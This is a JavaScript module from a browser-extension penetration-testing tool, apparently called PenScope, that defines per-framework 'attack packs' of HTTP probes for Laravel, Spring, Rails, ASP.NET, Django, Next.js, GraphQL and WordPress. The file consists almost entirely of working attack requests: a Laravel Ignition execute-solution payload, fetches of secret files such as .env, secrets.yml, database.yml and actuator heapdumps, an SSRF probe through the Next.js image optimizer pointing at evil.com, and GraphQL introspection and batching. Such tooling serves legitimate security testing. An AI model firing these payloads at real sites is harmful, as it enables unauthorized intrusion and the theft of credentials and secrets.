// PenScope v6.0 — Stack-Aware Attack Packs (red mode)
//
// This file is a reference copy of the STACK_ATTACK_PACKS dictionary that drives
// stack-aware probing in Red mode. The live copy lives inline in background.js
// (service workers cannot use ES module imports for non-typed files in MV3 without
// extra dance, and we deliberately keep zero new toolchain dependencies). Treat this
// file as the canonical source: when adding a new pack here, also paste the same
// definition into background.js's STACK_ATTACK_PACKS const. Tests / external tooling
// can read this file directly without loading the full SW.
//
// Schema:
//   key (lower-case identifier, must match what mapStackKey() in background.js
//        returns when normalizing a tech-stack name — e.g. "Laravel 9.x" → "laravel")
//   →  array of step objects:
//        step      identifier for this attack (used as id in results)
//        method    HTTP verb (default GET)
//        path      target path (relative to origin)
//        body      optional request body (string or object — object = JSON-encoded)
//        expect    optional array of substrings: if any appear in response body,
//                  flag confirmed
//        severity  override severity (default "medium")
//        custom    string identifier for non-standard attacks that need a code
//                  branch in the runner (e.g. "use-symbol-table-as-field-dict")
//
// Aggro gating: only `careful` (read-only) steps run in careful mode. `medium` runs
// most steps. `full` allows destructive steps (none of the packs below currently
// include destructive steps; future additions should mark them and the runner will
// skip them outside `full`).

const STACK_ATTACK_PACKS = {
  laravel: [
    { step: 'laravel-debug',       method: 'GET',  path: '/?XDEBUG_SESSION_START=1', expect: ['whoops','Stack trace'] },
    { step: 'laravel-ignition',    method: 'POST', path: '/_ignition/execute-solution',
      body: { solution: 'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
              parameters: { viewFile: 'phpinfo()', variableName: 'a' } },
      severity: 'critical' },
    { step: 'laravel-telescope',   method: 'GET',  path: '/telescope', expect: ['<title>Telescope'] },
    { step: 'laravel-horizon',     method: 'GET',  path: '/horizon', expect: ['Horizon'] },
    { step: 'laravel-env',         method: 'GET',  path: '/.env', expect: ['APP_KEY=','DB_PASSWORD'], severity: 'critical' },
    { step: 'laravel-storage',     method: 'GET',  path: '/storage/logs/laravel.log' },
    { step: 'laravel-debugbar',    method: 'GET',  path: '/_debugbar/open', expect: ['debugbar'] },
  ],
  spring: [
    { step: 'spring-actuator',     method: 'GET',  path: '/actuator' },
    { step: 'spring-heapdump',     method: 'GET',  path: '/actuator/heapdump', severity: 'critical' },
    { step: 'spring-env',          method: 'GET',  path: '/actuator/env' },
    { step: 'spring-mappings',     method: 'GET',  path: '/actuator/mappings' },
    { step: 'spring-trace',        method: 'GET',  path: '/actuator/trace' },
    { step: 'spring-jolokia',      method: 'GET',  path: '/jolokia/list' },
    { step: 'spring-h2-console',   method: 'GET',  path: '/h2-console' },
    { step: 'spring-loggers',      method: 'GET',  path: '/actuator/loggers' },
    { step: 'spring-beans',        method: 'GET',  path: '/actuator/beans' },
  ],
  rails: [
    { step: 'rails-secrets',       method: 'GET',  path: '/config/secrets.yml', severity: 'critical' },
    { step: 'rails-routes',        method: 'GET',  path: '/rails/info/routes' },
    { step: 'rails-properties',    method: 'GET',  path: '/rails/info/properties' },
    { step: 'rails-dj-console',    method: 'GET',  path: '/admin/jobs' },
    { step: 'rails-database',      method: 'GET',  path: '/config/database.yml', severity: 'critical' },
  ],
  aspnet: [
    { step: 'aspnet-trace',        method: 'GET',  path: '/trace.axd' },
    { step: 'aspnet-elmah',        method: 'GET',  path: '/elmah.axd' },
    { step: 'aspnet-debug',        method: 'GET',  path: '/?DEBUG=1' },
    { step: 'aspnet-bin',          method: 'GET',  path: '/bin/' },
    { step: 'aspnet-webconfig',    method: 'GET',  path: '/web.config' },
  ],
  django: [
    { step: 'django-debug',        method: 'GET',  path: '/?debug=1', expect: ['Django','DEBUG = True'] },
    { step: 'django-admin',        method: 'GET',  path: '/admin/' },
    { step: 'django-static',       method: 'GET',  path: '/static/admin/css/base.css' },
    { step: 'django-traceback',    method: 'GET',  path: '/__debug__/', custom: 'trigger-500-look-for-traceback' },
  ],
  nextjs: [
    { step: 'nextjs-build-manifest', method: 'GET', path: '/_next/static/development/_buildManifest.js' },
    { step: 'nextjs-data',         method: 'GET',  path: '/_next/data/' },
    { step: 'nextjs-image',        method: 'GET',  path: '/_next/image?url=https%3A%2F%2Fevil.com%2Fimg.png&w=64&q=75', custom: 'check-image-optimizer-ssrf' },
  ],
  graphql: [
    { step: 'graphql-introspect',  method: 'POST', path: '/graphql',
      body: { query: '{__schema{queryType{name} mutationType{name} types{name kind}}}' } },
    { step: 'graphql-batching',    method: 'POST', path: '/graphql',
      body: [ { query: '{__typename}' }, { query: '{__typename}' } ],
      custom: 'send-array-of-queries' },
    { step: 'graphql-field-fuzz',  method: 'POST', path: '/graphql', custom: 'use-symbol-table-as-field-dict' },
  ],
  wordpress: [
    { step: 'wp-rest-users',       method: 'GET',  path: '/wp-json/wp/v2/users' },
    { step: 'wp-xmlrpc',           method: 'POST', path: '/xmlrpc.php',
      body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' },
    { step: 'wp-readme',           method: 'GET',  path: '/readme.html' },
    { step: 'wp-admin-ajax',       method: 'GET',  path: '/wp-admin/admin-ajax.php?action=' },
  ],
};

// Map a tech-stack human-readable name to a STACK_ATTACK_PACKS key. The same logic
// is duplicated in background.js — keep these in sync.
function mapStackKey(name){
  if(!name)return null;
  const n=String(name).toLowerCase();
  if(/laravel/.test(n))return 'laravel';
  if(/spring|java/.test(n))return 'spring';
  if(/rails|ruby/.test(n))return 'rails';
  if(/asp\.?net|iis/.test(n))return 'aspnet';
  if(/django|flask|python/.test(n))return 'django';
  if(/next\.?js/.test(n))return 'nextjs';
  if(/graphql/.test(n))return 'graphql';
  if(/wordpress|wp/.test(n))return 'wordpress';
  return null;
}

// Export pattern compatible with both browser globals (Chrome MV3 SW imports) and
// CommonJS (Node-based test tooling, if anyone wires that up later).
if(typeof module!=='undefined'&&module.exports){
  module.exports={STACK_ATTACK_PACKS,mapStackKey};
}
if(typeof globalThis!=='undefined'){
  globalThis.PENSCOPE_STACK_PACKS=STACK_ATTACK_PACKS;
  globalThis.PENSCOPE_MAP_STACK_KEY=mapStackKey;
}
